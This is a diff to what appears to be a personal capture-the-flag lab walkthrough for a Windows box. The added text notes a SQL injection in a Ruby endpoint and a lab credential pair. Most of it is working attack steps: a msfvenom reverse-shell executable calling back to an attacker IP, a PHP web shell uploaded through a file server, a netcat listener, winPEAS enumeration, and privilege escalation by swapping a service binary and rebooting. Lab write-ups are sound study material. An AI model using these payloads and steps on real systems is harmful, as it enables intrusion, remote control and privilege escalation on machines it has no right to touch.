@@ -171,5 +171,58 @@ jerren.devops@company.com
 
 ```
 
-let's try `jerren.devops:paranoid` and load burpsuite to see if we can sql inject.
+let's try `jerren.devops:paranoid` (password reset) and load burpsuite to see if we can sql inject.
+
+http://192.168.52.127:33033/slug?URL=a
+
+sweet. sqlmap time. ACTUALLY, we can't automatically inject due to CSRF.
+
+```
+    sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
+    ret = ActiveRecord::Base.connection.execute(sql)
+    @text = ret
+  end
+```
+
+ok, so apparently we can get a rev shell from uploading a file to port `8000`.
+
+```bash
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f exe > reverse.exe
+
+# run.php contents:
+<?php
+$exec = system('C:/Users/Jerren/Desktop/reverse.exe')
+?>
+
+# (upload both reverse.exe and run.php)
+# by going to http://medjed:8000/fs/
+# upload reverse.exe to C:/Users/Jerren/Desktop/reverse.exe
+# upload run.php to C:/xampp/htdocs/run.php
+
+# start a nc listener on attacker
+nc -nvlp 4444
+
+# then, visit http://MEDJED:45332/run.php
+```
+
+now, we need to get winpeas on the system.
+
+https://github.com/peass-ng/PEASS-ng/releases/download/20260323-31545e76/winPEAS.bat
+
+winpeas spits out a lot at us...
+
+I can't find `C:\bd\bd.exe`, but apparently we're supposed to copy `reverse.exe` to `C:\bd\bd.exe`. let's do that.
+
+```bash
+
+# on victim
+move C:\bd\bd.exe C:\bd\bd2.exe
+copy /Y C:\Users\Jerren\Desktop\reverse.exe C:\bd\bd.exe
+shutdown /r /t 0
+
+# as attacker
+nc -nvlp 4444
+# (wait for boot of victim)
+```
 
